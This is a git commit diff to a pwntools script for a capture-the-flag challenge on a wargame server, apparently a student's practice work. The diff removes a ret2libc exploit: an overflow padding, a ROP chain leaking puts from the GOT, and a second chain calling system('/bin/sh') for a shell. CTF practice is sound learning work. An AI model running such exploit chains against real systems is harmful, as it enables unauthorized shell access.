0d48c1b8d282c554eb4dc1896e7efdc825e0731c
barbenhamou <barbenhamou2006@gmail.com>
2024-11-25 23:20:30 +0200

    finished dogs, not professor and not theater

--- theater/main.py
+++ theater/main.py
@@ -5,7 +5,7 @@ from pwn import *
 exe = context.binary = ELF('./professor')
 
 host = args.HOST or 'pwnable.co.il'
-port = int(args.PORT or 9003)
+port = int(args.PORT or 9011)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -35,35 +35,9 @@ continue
 
 # -- Exploit goes here --
 
-#libc_base = 0x00007ffff7da6000 #exe.libc.address 
-#system_addr = libc_base + 0x522c0 #exe.libc.symbols['system']
-#binsh_addr = libc_base + 0x1b45bd #next(exe.libc.search(b'/bin/sh')) #libc_base + 0x1b45bd
-rop_helper = 0x401393
-
 io = start()
 
-rop = ROP(exe)
-rop.raw('A' * 0x38)
-rop.puts(exe.got['puts'])
-rop.raw(exe.sym['start_routine'])
-rop.raw('A' * 0x828)
 
-io.sendline(rop.chain())
-
-puts_leak = u64(io.recv(6)+b"\x00")
-
-exe.libc.address = puts_leak - exe.libc.sym['system']
-
-binsh = next(exe.libc.search(b'/bin/sh\x00'))
-
-rop = ROP(exe.libc)
-rop.raw('A' * 0x38)
-rop.raw(rop_helper)
-rop.system(binsh)
-
-#payload = b'A' * 0x38 + p64(rop_helper) + p64(binsh_addr) + p64(system_addr) + b'A' * 0x820
-
-io.sendline(rop.chain())
 
 io.interactive()
 
